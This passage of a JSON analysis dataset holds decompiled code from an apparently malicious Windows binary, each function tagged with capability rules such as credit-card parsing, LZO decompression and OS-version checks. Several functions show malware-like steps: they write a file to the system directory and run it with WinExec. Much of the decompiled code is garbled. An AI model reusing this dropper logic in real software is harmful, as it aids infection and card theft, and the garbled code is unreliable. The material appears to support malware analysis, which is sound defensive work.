(bVar9 || bVar10)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        fcn.004039e0(str.h__1, 0xe, 0x407340);\n        uStack16 = 0xb;\n        uStack14 = 0;\n        uStack20 = 0x734c;\n        uStack18 = 0x40;\n        uStack24 = 0xe;\n        uStack22 = 0;\n        puStack28 = str.h__1;\n    }\n    uVar5 = fcn.004039e0();\n    bVar9 = false;\n    bVar10 = (((uVar5 & 0xff | (uVar5 >> 8 & extraout_DX_00 >> 8) << 8) * 2 | extraout_DX_00) ^ 0x6c00) == unaff_BX;\n    uStack16 = 4;\n    uStack14 = 0;\n    uStack20 = 0x7358;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    fcn.004039e0();\n    if ((!bVar9 && !bVar10) && (bVar9 || bVar10)) {\n        puVar8 = puStack28;\n    }\n    fcn.004039e0();\n    uStack16 = 0xc;\n    uStack14 = 0;\n    uStack20 = 0x7360;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    fcn.004039e0();\n    uStack16 = 4;\n    uStack14 = 0;\n    uStack20 = 0x736c;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    uVar5 = fcn.004039e0();\n    bVar9 = (CONCAT31(extraout_CH_02 & 0xb, 0xc) & (uVar4 & uVar5) + 0xaf70) == 0;\n    uStack16 = 9;\n    uStack14 = 0;\n    uStack20 = 0x7370;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    fcn.004039e0();\n    if ((!bVar9) && (bVar9)) {\n        out(*puVar8, extraout_DX_01);\n    }\n    fcn.004039e0();\n    uStack16 = 7;\n    uStack14 = 0;\n    uStack20 = 0x7394;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    uVar6 = fcn.004039e0();\n    return uVar6;\n}\n",
        "token_count": 2308
    },
    "00404df0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404fa4) overlaps instruction at (ram,0x00404fa3)\n// \n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.00404df0(uint param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    uint uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    uint8_t uVar8;\n    uint8_t extraout_CH;\n    char extraout_CH_00;\n    int32_t extraout_ECX;\n    uint8_t extraout_DL;\n    char *extraout_EDX;\n    char *pcVar9;\n    uint unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar10;\n    uint *unaff_EDI;\n    uint16_t in_CS;\n    bool in_CF;\n    bool bVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    char cVar13;\n    char cVar14;\n    ulong uVar15;\n    uint8_t in_stack_00000030;\n    uint uVar16;\n    uint32_t uVar17;\n    uint32_t uVar4;\n    \n    uVar8 = param_1 >> 8;\n    if ((in_CF) || (!in_CF)) {\n        uVar17 = 0x20;\n    }\n    else {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n        puVar1 = in_EAX + (in_CF == false) + 0x7c8ecaa9;\n        *puVar1 = *puVar1 & uVar8;\n        uVar17 = param_2 & 0xffff0000 | in_CS;\n    }\n    *(param_2 + 0xe) = *(param_2 + 0xe) + uVar8;\n    fcn.004039e0(str.h__1, uVar17);\n    fcn.004039e0(str.h__1, 0xe, 0x73bc, 0x26);\n    bVar11 = false;\n    uVar5 = fcn.004039e0(str.h__1, 0xe, 0x73e4, 8);\n    if ((!bVar11) && (bVar11)) {\n        out(0xbd, uVar5);\n        return;\n    }\n    uVar16 = 0x4073ec;\n    uVar5 = 0xe;\n    fcn.004039e0(str.h__1, 0xe, 0x4073ec, 0x19);\n    iVar6 = fcn.004039e0(str.h__1, 0xe, 0x7408, 0xb);\n    bVar11 = (POPCOUNT(iVar6 + 1U & 0xff) & 1U) == 0;\n    uVar17 = 0x404ed7;\n    uVar15 = fcn.004039e0(str.h__1, 0xe, 0x7414, 0x12);\n    pcVar9 = uVar15 >> 0x20;\n    pcVar7 = uVar15;\n    if ((bVar11) || (uVar17 = uVar17 & 0xffff | unaff_ESI << 0x10,  !bVar11)) {\n        uVar17 = 0x12;\n        uVar16 = 0x407428;\n        uVar5 = 0xe;\n        iVar6 = extraout_ECX;\ncode_r0x00404ef4:\n        pcVar9[0xe] = pcVar9[0xe] + (iVar6 >> 8);\n        fcn.004039e0(str.h__1, uVar5, uVar16, uVar17);\n        bVar11 = false;\n        bVar12 = (extraout_DL ^ unaff_EBX >> 8 | 0x67) == 0;\n        fcn.004039e0(str.h__1, 0xe, 0x743c, 2);\n        pcVar9 = extraout_EDX;\n        uVar8 = extraout_CH;\n        if ((!bVar11 && !bVar12) && (puVar10 = unaff_ESI,  bVar11 || bVar12)) goto code_r0x00404f36;\n        uVar16 = 0x407440;\n        uVar5 = 0xe;\n    }\n    else {\n        puVar10 = unaff_ESI + 1;\n        out(*unaff_ESI, uVar15 >> 0x20);\n        do {\n            cVar13 = pcVar7 >> 8;\n            in_AF = 9 < (pcVar7 & 0xf) | in_AF;\n            pcVar7 = CONCAT31(CONCAT21(pcVar7 >> 0x10, cVar13 - in_AF), -in_AF);\n        } while (in_AF || cVar13 == *pcVar9);\n        puVar2 = unaff_EDI + pcVar9 * 2;\n        uVar3 = *puVar2;\n        uVar4 = *puVar2;\n        *puVar2 = (uVar4 + 0x7b) - in_AF;\n        *(extraout_ECX + 0x6a) = pcVar7;\n        uVar8 = (extraout_ECX >> 8) + pcVar7[0x28] + (uVar3 < 0xffffff85 || uVar4 + 0x7b < in_AF);\n        iVar6 = uVar8 << 8;\n        unaff_ESI = puVar10;\n        if (uVar8 != 0) goto code_r0x00404ef4;\n        *pcVar7 = *pcVar7 + -in_AF;\ncode_r0x00404f36:\n        *unaff_EDI = *puVar10;\n        if ((in_stack_00000030 | uVar8) == 0) goto code_r0x00404f86;\n    }\n    pcVar9 = pcVar9 + 0xe;\n    cVar14 = SCARRY1(*pcVar9, uVar8);\n    *pcVar9 = *pcVar9 + uVar8;\n    cVar13 = *pcVar9 < '\\0';\n    uVar15 = fcn.004039e0(str.h__1, uVar5, uVar16);\n    iVar6 = uVar15 >> 0x20;\n    if (((cVar14 == cVar13) && (cVar14 != cVar13)) && (bVar11 = iVar6 == 0x4868086a,  iVar6 = uVar15,  bVar11)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *(iVar6 + 0xe) = *(iVar6 + 0xe) + extraout_CH_00;\n    fcn.004039e0(str.h__1);\ncode_r0x00404f86:\n    fcn.004039e0(str.h__1, 0xe, 0x7450, 6);\n    fcn.004039e0(str.h__1, 0xe, 0x7458, 7);\n    fcn.004039e0(str.h__1, 0xe, 0x7460, 7);\n    fcn.004039e0(str.h__1, 0xe, 0x407468, 6);\n    fcn.004039e0(str.h__1, 0xe, 0x7470, 0x25);\n    fcn.004039e0(str.h__1, 0xe, 0x7498, 8);\n    return;\n}\n",
        "token_count": 1744
    },
    "00402860": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004029f6) overlaps instruction at (ram,0x004029f1)\n// \n\nuint __cdecl fcn.00402860(int16_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uint32_t *extraout_ECX;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    int16_t *piVar7;\n    int32_t unaff_EBX;\n    int32_t iVar8;\n    ushort unaff_SI;\n    uint32_t *puVar9;\n    uint unaff_EDI;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    unkbyte6 Var13;\n    uint16_t uStack20;\n    uchar uStack18;\n    uchar uStack17;\n    ushort uStack16;\n    uint var_4h;\n    \n    uStack20 = unaff_EDI;\n    uStack18 = unaff_EDI >> 0x10;\n    uStack17 = unaff_EDI >> 0x18;\n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    puVar3 = *(arg_8h + 0x1e) + arg_8h;\n    if (*puVar3 != 0x4550) {\n        return 0;\n    }\n    if ((0x4550 < *puVar3) && (*puVar3 < 0x4551)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    puVar5 = puVar3[0x16];\n    if (puVar5 != NULL) {\n        return 0;\n    }\n    uVar6 = *(arg_8h + 0x1e);\n    bVar12 = *(arg_8h + 0x1e) != 0x80;\n    if (uVar6 < 0x81) {\n        return 0;\n    }\n    if ((bVar12) && (!bVar12)) {\n        iVar8 = unaff_EBX + 1;\n        Var13 = CONCAT24(uStack20, iVar8);\n        puVar9 = 0x40;\n        uStack16 = unaff_SI;\n        if (uVar6 < 0x80 || iVar8 == 0) goto code_r0x00402996;\n        uVar2 = 9 < (puVar3 & 0xf) | in_AF;\n        puVar3 = puVar3 & 0xffff0000 | CONCAT11((puVar3 >> 8) + uVar2, puVar3 + uVar2 * '\\x06') & 0xff0f;\n        *(puVar3 + 0x2a) = *(puVar3 + 0x2a) - iVar8;\n    }\n    Var13 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    if (Var13 == 0) {\n        return 0;\n    }\n    uStack18 = Var13;\n    uStack17 = Var13 >> 8;\n    uStack16 = Var13 >> 0x10;\n    puVar5 = extraout_ECX;\n    puVar9 = puVar3;\ncode_r0x00402996:\n    uStack20 = Var13 >> 0x20;\n    piVar7 = uStack20;\n    puVar4 = CONCAT22(uStack16, CONCAT11(uStack17, uStack18));\n    bVar12 = false;\n    puVar10 = NULL;\n    puVar3 = puVar9;\n    if (puVar9 != NULL) {\n        do {\n            if ((!bVar12) && (bVar12)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            iVar8 = (*_sym.imp.MSVCRT.dll_rand)();\n            puVar5 = 0xff;\n            puVar4 = iVar8 / 0xff;\n            piVar7 = iVar8 % 0xff;\n            puVar11 = puVar10 + 1;\n            bVar12 = SBORROW4(puVar11, puVar9);\n            puVar3 = puVar11 - puVar9;\n            *(puVar10 + Var13) = piVar7;\n            puVar10 = puVar11;\n        } while (puVar11 < puVar9);\n    }\n    bVar12 = (POPCOUNT(puVar3 & 0xff) & 1U) == 0;\n    if ((bVar12) || (!bVar12)) {\n        puVar4 = puVar9;\n        puVar5 = puVar9;\n        piVar7 = arg_8h;\n    }\n    iVar8 = *0x8b17b43a;\n    puVar1 = Var13 + -0x743e7432;\n    *puVar1 = *puVar1 | puVar5;\n    uVar6 = puVar5 >> 2;\n    puVar3 = 0x34a96cf4;\n    puVar5 = puVar4 + 0x20;\n    for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar5 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    for (uVar6 = piVar7 + 1U & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar5 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(*(iVar8 + -4));\n    return 1;\n}\n",
        "token_count": 1324
    },
    "004031c0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004031c0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    uint *puVar13;\n    uchar *filename;\n    uchar *mode;\n    uint nitems;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x424500 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    nitems = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004019e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072f4, acStack1304, &uStack2112);\n    uStack2088 = 0x40737c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar11 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar11 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar11;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar13 = pcVar11 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar13 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar13 = puVar13 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar13 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar13 = puVar13 + 1;\n        }\n    } while (iVar2 != 0);\n    iVar2 = acStack1304[0];\n    mode = auStack1824;\n    filename = auStack1824;\n    pcVar9 = &cStack2084;\n    pcVar8 = acStack1045 + 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    pcVar11 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar11 = pcVar11 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar11 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar11 = 0x407394;\n    do {\n        pcVar10 = pcVar11;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar10 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar10;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar4 = -1;\n    pcVar11 = acStack1045 + 1;\n    do {\n        pcVar12 = pcVar11;\n        if (iVar4 == 0) break;\n        iVar4 = iVar4 + -1;\n        pcVar12 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar12;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar10 + -uVar3;\n    puVar13 = pcVar12 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar13 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar13 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    pcVar11 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar11 = pcVar11 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar11 != '\\0');\n    iVar2 = fcn.004010d0(auStack1564, 0x4072f0, acStack1045 + 1, ~uVar3 - 1, pcVar8, pcVar9, filename, mode, iVar2, \n                         nitems);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1945
    },
    "00401c20": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool fcn.00401c20(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uchar *unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    unkbyte6 Var5;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar2 != 0) {\n        return false;\n    }\n    Var5 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    puVar1 = Var5;\n    bVar4 = puVar1 == NULL;\n    if (bVar4) {\n        return false;\n    }\n    if ((!bVar4) && (bVar4)) {\n        puVar1 = *0x4bb148d3;\n        out(*unaff_ESI, Var5 >> 0x20);\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 369
    },
    "00401d30": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401dde) overlaps instruction at (ram,0x00401ddb)\n// \n// WARNING: Removing unreachable block (ram,0x00401daf)\n// WARNING: Heritage AFTER dead removal. Example location: s0x00000004 : 0x00401e7d\n// WARNING: Removing unreachable block (ram,0x0040226a)\n// WARNING: Removing unreachable block (ram,0x00401f01)\n// WARNING: Removing unreachable block (ram,0x00401f1f)\n// WARNING: Removing unreachable block (ram,0x00402293)\n// WARNING: Removing unreachable block (ram,0x0040229a)\n// WARNING: Removing unreachable block (ram,0x004022a0)\n// WARNING: Removing unreachable block (ram,0x00401f27)\n// WARNING: Removing unreachable block (ram,0x004021f9)\n// WARNING: Removing unreachable block (ram,0x0040223c)\n// WARNING: Removing unreachable block (ram,0x00402050)\n// WARNING: Removing unreachable block (ram,0x00401fb1)\n// WARNING: Removing unreachable block (ram,0x00401fcc)\n// WARNING: Removing unreachable block (ram,0x004021fb)\n// WARNING: Removing unreachable block (ram,0x00401fd4)\n// WARNING: Removing unreachable block (ram,0x00401fe8)\n// WARNING: Removing unreachable block (ram,0x00401ffc)\n// WARNING: Removing unreachable block (ram,0x00402034)\n// WARNING: Removing unreachable block (ram,0x0040205f)\n// WARNING: Removing unreachable block (ram,0x00402084)\n// WARNING: Removing unreachable block (ram,0x004021cf)\n// WARNING: Removing unreachable block (ram,0x004021d7)\n// WARNING: Removing unreachable block (ram,0x004021dd)\n// WARNING: Removing unreachable block (ram,0x0040208c)\n// WARNING: Removing unreachable block (ram,0x0040217f)\n// WARNING: Removing unreachable block (ram,0x0040218a)\n// WARNING: Removing unreachable block (ram,0x00402190)\n// WARNING: Removing unreachable block (ram,0x0040219b)\n// WARNING: Removing unreachable block (ram,0x004021e8)\n// WARNING: Removing unreachable block (ram,0x004021ee)\n// WARNING: Removing unreachable block (ram,0x004020a0)\n// WARNING: Removing unreachable block (ram,0x004020da)\n// WARNING: Removing unreachable block (ram,0x004020ed)\n// WARNING: Removing unreachable block (ram,0x004020ef)\n// WARNING: Removing unreachable block (ram,0x0040219d)\n// WARNING: Removing unreachable block (ram,0x004021bc)\n// WARNING: Removing unreachable block (ram,0x004021c2)\n// WARNING: Removing unreachable block (ram,0x004021cd)\n// WARNING: Removing unreachable block (ram,0x00402203)\n// WARNING: Removing unreachable block (ram,0x00402209)\n// WARNING: Removing unreachable block (ram,0x00402124)\n// WARNING: Removing unreachable block (ram,0x00402136)\n// WARNING: Removing unreachable block (ram,0x0040213c)\n// WARNING: Removing unreachable block (ram,0x00402147)\n// WARNING: Removing unreachable block (ram,0x0040214d)\n// WARNING: Removing unreachable block (ram,0x004020a7)\n// WARNING: Removing unreachable block (ram,0x004020b2)\n// WARNING: Removing unreachable block (ram,0x004020b8)\n// WARNING: Removing unreachable block (ram,0x004020c3)\n// WARNING: Removing unreachable block (ram,0x004020c9)\n// WARNING: Removing unreachable block (ram,0x00401fef)\n// WARNING: Removing unreachable block (ram,0x00401ffa)\n// WARNING: Removing unreachable block (ram,0x0040203f)\n// WARNING: Removing unreachable block (ram,0x00402045)\n// WARNING: Removing unreachable block (ram,0x00402056)\n// WARNING: Removing unreachable block (ram,0x004020d8)\n// WARNING: Removing unreachable block (ram,0x00402158)\n// WARNING: Removing unreachable block (ram,0x0040215e)\n// WARNING: Removing unreachable block (ram,0x00402162)\n// WARNING: Removing unreachable block (ram,0x00401f42)\n// WARNING: Removing unreachable block (ram,0x00401fa9)\n// WARNING: Removing unreachable block (ram,0x00402220)\n// WARNING: Removing unreachable block (ram,0x0040222b)\n// WARNING: Removing unreachable block (ram,0x00402234)\n// WARNING: Removing unreachable block (ram,0x00402242)\n// WARNING: Removing unreachable block (ram,0x0040217a)\n// WARNING: Removing unreachable block (ram,0x00402214)\n// WARNING: Removing unreachable block (ram,0x0040221a)\n// WARNING: Removing unreachable block (ram,0x00402246)\n// WARNING: Removing unreachable block (ram,0x0040224c)\n// WARNING: Removing unreachable block (ram,0x00402256)\n// WARNING: Removing unreachable block (ram,0x0040225c)\n// WARNING: Removing unreachable block (ram,0x00402270)\n// WARNING: Removing unreachable block (ram,0x004022c1)\n// WARNING: Removing unreachable block (ram,0x004022ae)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t fcn.00401d30(uint32_t param_1)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint16_t extraout_CX;\n    uchar *extraout_ECX;\n    uint8_t uVar7;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uchar *puVar8;\n    uint16_t in_SS;\n    uint16_t in_DS;\n    uint *in_FS_OFFSET;\n    bool bVar9;\n    bool bVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint uStack40;\n    uint *puVar13;\n    uint in_stack_ffffffe4;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack40 = param_1;\n    puVar13 = unaff_EDI;\n    uVar11 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    uVar6 = uVar11 >> 0x20;\n    bVar10 = SCARRY4(&uStack40, 4);\n    bVar9 = *0x10 == 0x24;\n    if (bVar10) {\ncode_r0x00401d6a:\n        uStack24 = 0x407450;\n        uStack20 = 0x407448;\n        uStack16 = 0x407458;\n        uStack12 = 0x407460;\n        uStack8 = 0x407468;\n        if (bVar10 == &stack0xffffffdc < 0) {\n            uStack40 = uStack40 & 0xffff | uVar6 << 0x10;\n            if (bVar10 != &stack0xffffffdc < 0) {\n                out(0xc4, uVar11);\n                uStack40 = uVar6 << 0x10 | in_DS;\n                *unaff_EDI = uVar11;\n            }\n        }\n        puVar8 = NULL;\n        uVar6 = param_1;\ncode_r0x00401db0:\n        unaff_ESI = &uStack24;\n        do {\n            uStack40 = uVar6;\n            uVar12 = (*_sym.imp.MSVCRT.dll_strstr)();\n            if (uVar12 != 0) {\n                return 1;\n            }\n            puVar8 = puVar8 + 1;\n            unaff_ESI = unaff_ESI + 1;\n            bVar9 = puVar8 == 0x5;\n        } while (puVar8 < 0x5);\n        if (!bVar9) {\n            puVar13 = extraout_CX << 0x10;\n            goto code_r0x00401dd5;\n        }\n    }\n    else {\n        uStack40 = uStack40 & 0xffff | uVar6 << 0x10;\n        uStack40._2_2_ = uVar11 >> 0x20;\n        uVar6 = uVar6 & 0xffff;\n        uVar12 = uVar11 & 0xffffffffffff;\n        if (!bVar10) goto code_r0x00401d6a;\n        puVar8 = unaff_EDI + 1;\n        uVar2 = in(uStack40._2_2_);\n        *unaff_EDI = uVar2;\n        uVar6 = CONCAT31(param_1 >> 8, 0xbc);\n        if (0xfffffffb < &uStack40 || bVar9) {\n            uStack40 = 0x56;\n            uVar6 = param_1 & 0xffff0000 | CONCAT11(*extraout_ECX, 0xbc);\n            if (!bVar9) {\n                LOCK();\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            goto code_r0x00401db0;\n        }\ncode_r0x00401dd5:\n        if (bVar9) {\n            if ((uVar12 & 0x406818c5) == 0) {\n                (*_sym.imp.ole32.dll_CoInitialize)(0, puVar13 & 0xffff0000 | in_SS, unaff_ESI, uVar6);\n                iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407408);\n                bVar9 = false;\n                bVar10 = iVar5 == 0;\n                if (bVar10) {\n                    _pe_dos_header = &stack0xffffffdc;\n                    *in_FS_OFFSET = uStack16;\n                    return 1;\n                }\n                uVar6 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407414);\n                if ((!bVar9 && !bVar10) && (bVar9 || bVar10)) {\n                    uVar6 = uVar6 & 0xe2f4cc58;\n                }\n                (*_sym.imp.USER32.dll_SendMessageTimeoutA)(param_1, uVar6, 0, 0, 2, 1000, &stack0xffffffe4);\n                pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar5, 0x407428);\n                if (pcVar4 != NULL) {\n                    uStack8 = 0;\n                    uVar6 = (*pcVar4)(in_stack_ffffffe4, str._D_3, 0, &stack0xffffffdc);\n                    uStack8 = 0xffffffff;\n                    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n                    (*_sym.imp.ole32.dll_CoUninitialize)();\n                    _pe_dos_header = &stack0xffffffdc;\n                    *in_FS_OFFSET = uStack16;\n                    return uVar6;\n                }\n                _pe_dos_header = &stack0xffffffdc;\n                *in_FS_OFFSET = uStack16;\n                return 1;\n            }\n            puVar1 = uVar6 - 1;\n            uVar3 = *puVar1;\n            uVar7 = uVar12 >> 0x20;\n            *puVar1 = *puVar1 + uVar7;\n            pcVar4 = sym.imp.MSVCRT.dll_strstr + CARRY1(uVar3, uVar7) + uVar12;\n            goto code_r0x00401dea;\n        }\n    }\n    uStack40 = uVar6;\n    pcVar4 = (*_sym.imp.MSVCRT.dll_strstr)();\ncode_r0x00401dea:\n    return pcVar4 == NULL;\n}\n",
        "token_count": 2693
    },
    "00402fb0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402fb0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00401010(0x80000002, 0x4071e8, 0x407234, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 133
    },
    "00403950": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00403950(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "004041c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
